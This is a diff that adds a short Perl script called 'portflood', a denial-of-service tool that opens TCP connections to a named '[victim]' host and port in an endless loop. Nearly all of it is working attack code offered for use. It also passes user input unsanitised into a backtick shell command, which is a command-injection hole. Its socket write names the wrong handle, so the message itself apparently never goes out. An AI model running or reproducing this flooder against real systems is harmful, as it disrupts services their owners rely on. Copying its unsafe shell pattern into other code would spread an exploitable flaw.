@@ -1,0 +1,26 @@
+#!/usr/bin/perl
+# portflood [victim] [port]   
+# v 1.0.1
+
+use IO::Socket;
+$| = 1;
+
+$target = shift || 'localhost';
+$port   = shift || 80;
+
+print "Enter a message or \@filename: ";
+chomp($mesg = <STDIN>);
+if($mesg =~ /^\@(.*)/) {
+	$mesg = `cat $1`;
+	print "Read " . length($mesg) . " characters from file '$1'\n";
+}
+
+print "Connecting to $target:$port ...\n";
+
+while(++$i) {
+	$sock = IO::Socket::INET->new(PeerAddr => "$target:$port", Proto=>'tcp', Timeout => 1);
+	print "\r$i                      " if(!($i % 10));
+	print "\r$i: Connection failed!\n" if(!$sock);
+	print SOCK $mesg;
+	close($sock);
+}
